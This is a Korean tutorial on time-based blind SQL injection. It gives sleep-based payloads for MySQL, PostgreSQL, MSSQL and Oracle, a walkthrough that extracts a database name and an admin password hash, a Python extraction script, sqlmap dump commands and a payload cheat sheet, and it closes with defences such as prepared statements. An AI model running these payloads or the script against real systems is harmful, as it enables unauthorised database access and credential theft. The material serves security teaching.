Time-based Blind SQL Injection

Time-based Blind SQLi는 데이터베이스의 응답 시간 지연을 이용하여 데이터를 추출하는 Blind SQL Injection 기법입니다.

개념 (Concept)​

Time-based Blind SQLi란?​

Time-based Blind SQL Injection은 SQL 쿼리 결과에 따라 의도적으로 지연 시간을 발생시켜, 응답 시간 차이로 참/거짓을 판단하는 기법입니다.

작동 원리:

참 조건 → SLEEP(5) 실행 → 5초 후 응답
거짓 조건 → SLEEP(5) 건너뜀 → 즉시 응답

예시:

-- 참일 때: 5초 지연
' AND IF(1=1, SLEEP(5), 0)--

-- 거짓일 때: 즉시 응답
' AND IF(1=2, SLEEP(5), 0)--

왜 Time-based를 사용하는가?​

사용 시나리오:

  1. 페이지 응답이 항상 동일할 때: Boolean-based 불가능
  2. 쿼리 결과가 전혀 출력되지 않을 때: 로그 기록, 쿠키 처리 등
  3. 최후의 수단: 가장 느리지만 가장 범용적

작동 조건:

다른 모든 SQLi 기법이 실패했을 때
  ↓
페이지 내용이 동일해도 시간 차이로 판단 가능

장단점:

장점단점
응답이 동일해도 작동매우 느림 (각 문자당 5초+)
가장 범용적네트워크 지연 영향 받음
WAF 우회 가능성 높음서버 부하 유발

DBMS별 시간 지연 함수​

MySQL​

-- SLEEP 함수 (초 단위)
SLEEP(5)

-- 조건부 SLEEP
IF(조건, SLEEP(5), 0)

-- 예시
' AND IF(1=1, SLEEP(5), 0)--

PostgreSQL​

-- pg_sleep 함수
pg_sleep(5)

-- 예시
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

MSSQL (Microsoft SQL Server)​

-- WAITFOR DELAY (시:분:초 형식)
WAITFOR DELAY '00:00:05'

-- 조건부 WAITFOR
IF (1=1) WAITFOR DELAY '00:00:05'

-- 예시
'; IF (1=1) WAITFOR DELAY '00:00:05'--

Oracle​

-- dbms_lock.sleep (초 단위)
BEGIN dbms_lock.sleep(5); END;

-- 예시
' AND (SELECT CASE WHEN (1=1) THEN dbms_lock.sleep(5) ELSE NULL END FROM dual) IS NOT NULL--

공격 단계​

1단계: 취약점 확인​

시간 지연 테스트 (MySQL):

http://example.com/product?id=1' AND SLEEP(5)--

결과:

  • 5초 이상 지연: Time-based SQLi 취약
  • 즉시 응답: 취약하지 않거나 다른 DBMS

다른 DBMS도 시도:

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- MSSQL
'; WAITFOR DELAY '00:00:05'--

2단계: 조건부 시간 지연 테스트​

참 조건 테스트:

' AND IF(1=1, SLEEP(5), 0)--

→ 5초 지연 (참이므로 SLEEP 실행)

거짓 조건 테스트:

' AND IF(1=2, SLEEP(5), 0)--

→ 즉시 응답 (거짓이므로 SLEEP 건너뜀)

결론: 조건에 따라 시간 차이 발생 → Time-based Blind SQLi 가능

3단계: 데이터베이스명 길이 확인​

-- DB명 길이가 5인가?
' AND IF(LENGTH(database())=5, SLEEP(5), 0)--
→ 즉시 응답 (거짓)

-- DB명 길이가 6인가?
' AND IF(LENGTH(database())=6, SLEEP(5), 0)--
→ 즉시 응답 (거짓)

-- DB명 길이가 7인가?
' AND IF(LENGTH(database())=7, SLEEP(5), 0)--
→ 5초 지연 (참)

결론: 데이터베이스명은 7글자

4단계: 데이터베이스명 첫 글자 추출​

-- 첫 글자가 's'인가?
' AND IF(SUBSTRING(database(), 1, 1)='s', SLEEP(5), 0)--
→ 5초 지연 (참)

-- 두 번째 글자가 'h'인가?
' AND IF(SUBSTRING(database(), 2, 1)='h', SLEEP(5), 0)--
→ 5초 지연 (참)

5단계: 반복하여 전체 추출​

이런 식으로 반복:

s → sh → sho → shop → shop_ → shop_d → shop_db

각 문자당 약 5초씩 소요 → 총 7글자 × 5초 = 최소 35초

효율적인 추출 기법​

방법 1: ASCII 이진 탐색​

문자를 하나씩 비교하는 대신 ASCII 코드 범위로 좁히기

-- 첫 글자 ASCII가 100보다 큰가?
' AND IF(ASCII(SUBSTRING(database(), 1, 1)) > 100, SLEEP(5), 0)--
→ 5초 지연 (참, 100보다 큼)

-- 첫 글자 ASCII가 120보다 큰가?
' AND IF(ASCII(SUBSTRING(database(), 1, 1)) > 120, SLEEP(5), 0)--
→ 즉시 응답 (거짓, 100~120 사이)

-- 첫 글자 ASCII가 110보다 큰가?
' AND IF(ASCII(SUBSTRING(database(), 1, 1)) > 110, SLEEP(5), 0)--
→ 5초 지연 (참, 110~120 사이)

-- 첫 글자 ASCII가 115인가?
' AND IF(ASCII(SUBSTRING(database(), 1, 1)) = 115, SLEEP(5), 0)--
→ 5초 지연 (참, ASCII 115 = 's')

이진 탐색으로 평균 7~8번 만에 찾을 수 있음 (26자 일일이 비교하는 것보다 훨씬 빠름)

방법 2: 지연 시간 줄이기​

-- 5초 대신 2초 사용
' AND IF(1=1, SLEEP(2), 0)--

주의: 너무 짧으면 네트워크 지연과 구분 어려움

실전 공격 시나리오​

시나리오: 로그인 폼 (쿠키 기반 인증)​

취약한 URL:

http://example.com/profile.php?user_id=5

특징:

  • 페이지 내용이 항상 동일
  • 쿼리 결과가 출력되지 않음
  • Boolean-based 불가능

1단계: Time-based 취약점 확인

http://example.com/profile.php?user_id=5' AND SLEEP(5)--

→ 5초 지연 (취약함)

2단계: 조건부 지연 테스트

5' AND IF(1=1, SLEEP(5), 0)--

→ 5초 지연

5' AND IF(1=2, SLEEP(5), 0)--

→ 즉시 응답

결론: Time-based Blind SQLi 가능

3단계: 현재 사용자 추출

-- 사용자명 길이가 4인가?
5' AND IF(LENGTH(user())=4, SLEEP(3), 0)--
→ 3초 지연 (참, 길이 4)

-- 첫 글자가 'r'인가?
5' AND IF(SUBSTRING(user(), 1, 1)='r', SLEEP(3), 0)--
→ 3초 지연 (참)

-- 두 번째 글자가 'o'인가?
5' AND IF(SUBSTRING(user(), 2, 1)='o', SLEEP(3), 0)--
→ 3초 지연 (참)

결과: 현재 DB 사용자는 root

4단계: 관리자 비밀번호 추출

-- 비밀번호 길이
5' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin')=32, SLEEP(3), 0)--
→ 3초 지연 (MD5 해시, 32자)

-- 첫 글자 추출
5' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='5', SLEEP(3), 0)--
→ 3초 지연

이런 식으로 32자를 모두 추출... (매우 느림)

Python 자동화 스크립트​

import requests
import time
import string

url = "http://example.com/profile.php"
result = ""
delay = 3  # 3초 지연

# 1. DB명 길이 찾기
for length in range(1, 20):
    payload = f"5' AND IF(LENGTH(database())={length}, SLEEP({delay}), 0)--"
    start_time = time.time()
    requests.get(url, params={'user_id': payload})
    elapsed = time.time() - start_time

    if elapsed >= delay:
        print(f"[+] DB명 길이: {length}")
        target_length = length
        break

# 2. DB명 한 글자씩 추출 (이진 탐색)
for position in range(1, target_length + 1):
    # ASCII 이진 탐색 (32~126)
    low, high = 32, 126

    while low <= high:
        mid = (low + high) // 2
        payload = f"5' AND IF(ASCII(SUBSTRING(database(), {position}, 1))>{mid}, SLEEP({delay}), 0)--"

        start_time = time.time()
        requests.get(url, params={'user_id': payload})
        elapsed = time.time() - start_time

        if elapsed >= delay:  # 참 (mid보다 큼)
            low = mid + 1
        else:  # 거짓 (mid 이하)
            high = mid - 1

    result += chr(low)
    print(f"[+] 진행: {result}")

print(f"[+] 최종 DB명: {result}")

출력 예시:

[+] DB명 길이: 7
[+] 진행: s
[+] 진행: sh
[+] 진행: sho
[+] 진행: shop
[+] 진행: shop_
[+] 진행: shop_d
[+] 진행: shop_db
[+] 최종 DB명: shop_db

SQLMap을 이용한 Time-based 공격​

기본 스캔​

sqlmap -u "http://example.com/profile.php?user_id=5" --technique=T --batch

옵션:

  • --technique=T: Time-based만 사용
  • --time-sec=3: 지연 시간을 3초로 설정 (기본 5초)

지연 시간 조정​

sqlmap -u "http://example.com/profile.php?user_id=5" --technique=T --time-sec=3

데이터 추출​

# 현재 DB
sqlmap -u "http://example.com/profile.php?user_id=5" --technique=T --current-db

# 테이블 나열
sqlmap -u "http://example.com/profile.php?user_id=5" --technique=T -D shop_db --tables

# 사용자 데이터 추출 (매우 느림)
sqlmap -u "http://example.com/profile.php?user_id=5" --technique=T -D shop_db -T users --dump

네트워크 지연 문제 해결​

문제: 네트워크 지연과 구분 어려움​

정상 네트워크 지연: 0.1~0.5초 SLEEP(5) 지연: 5.0초+

해결 방법:

# 여러 번 측정하여 평균 계산
def is_delayed(url, payload, delay=5, threshold=4):
    times = []
    for _ in range(3):  # 3번 측정
        start = time.time()
        requests.get(url, params={'id': payload})
        elapsed = time.time() - start
        times.append(elapsed)

    avg_time = sum(times) / len(times)
    return avg_time >= threshold  # 4초 이상이면 참

지연 시간 선택 가이드​

네트워크 상태권장 SLEEP 시간threshold
로컬 테스트2초1.5초
안정적인 인터넷3초2.5초
불안정한 네트워크5초4초
매우 느린 서버10초8초

방어 기법​

1. Prepared Statements​

// 취약한 코드
$user_id = $_GET['user_id'];
$query = "SELECT * FROM profiles WHERE id = $user_id";

// 안전한 코드
$stmt = $pdo->prepare("SELECT * FROM profiles WHERE id = ?");
$stmt->execute([$_GET['user_id']]);

2. 쿼리 타임아웃 설정​

// MySQL 쿼리 타임아웃 (초)
$pdo->exec("SET SESSION MAX_EXECUTION_TIME=1000");
-- MSSQL 쿼리 타임아웃
SET QUERY_GOVERNOR_COST_LIMIT 1000;

3. Rate Limiting​

# Nginx 설정 - 느린 요청 차단
client_body_timeout 10s;
client_header_timeout 10s;

4. SLEEP 함수 권한 제거​

-- MySQL: 일반 사용자에게 SLEEP 권한 없음 (기본적으로 허용됨)
-- 해결책: 웹 애플리케이션 DB 사용자 권한 최소화
GRANT SELECT ON shop_db.* TO 'web_user'@'localhost';

트러블슈팅 체크리스트​

Time-based가 작동하지 않을 때​

  • 지연 시간이 충분한가?

    • 네트워크 지연을 고려하여 5초 이상 사용

  • DBMS에 맞는 함수를 사용하는가?

    • MySQL: SLEEP()
    • MSSQL: WAITFOR DELAY
    • PostgreSQL: pg_sleep()

  • 네트워크 지연과 혼동하지 않는가?

    • 여러 번 측정하여 평균 계산
    • baseline 시간 먼저 측정

  • 쿼리 타임아웃이 설정되어 있는가?

    • 서버 설정 확인
    • 더 짧은 지연 시간 사용

핵심 정리​

Time-based 공격 플로우​

1. 취약점 탐지 (SLEEP(5) 테스트)
   ↓
2. 조건부 지연 테스트 (IF 함수)
   ↓
3. 데이터 길이 파악 (LENGTH 함수)
   ↓
4. ASCII 이진 탐색으로 문자 추출
   ↓
5. 네트워크 지연 고려하여 threshold 설정
   ↓
6. 스크립트 자동화 (SQLMap 추천)

자주 사용하는 페이로드​

-- MySQL
' AND SLEEP(5)--
' AND IF(1=1, SLEEP(5), 0)--
' AND IF(SUBSTRING(database(), 1, 1)='s', SLEEP(5), 0)--

-- MSSQL
'; WAITFOR DELAY '00:00:05'--
'; IF (1=1) WAITFOR DELAY '00:00:05'--

-- PostgreSQL
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
